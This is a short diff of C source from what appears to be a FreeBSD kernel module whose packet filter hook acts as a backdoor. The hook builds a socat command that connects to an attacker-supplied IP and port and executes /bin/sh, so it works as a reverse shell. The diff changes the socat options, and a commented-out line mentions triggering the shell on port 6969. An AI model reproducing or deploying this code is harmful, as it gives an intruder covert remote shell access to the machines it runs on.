@@ -284,7 +284,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     printf("Kernel IP Address: %s\n", attacker_ip_str);
 
     // create the reverse shell command
-    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh,pty,stderr 2>/dev/null", attacker_ip_str, LISTEN_PORT);
+    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);
 
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
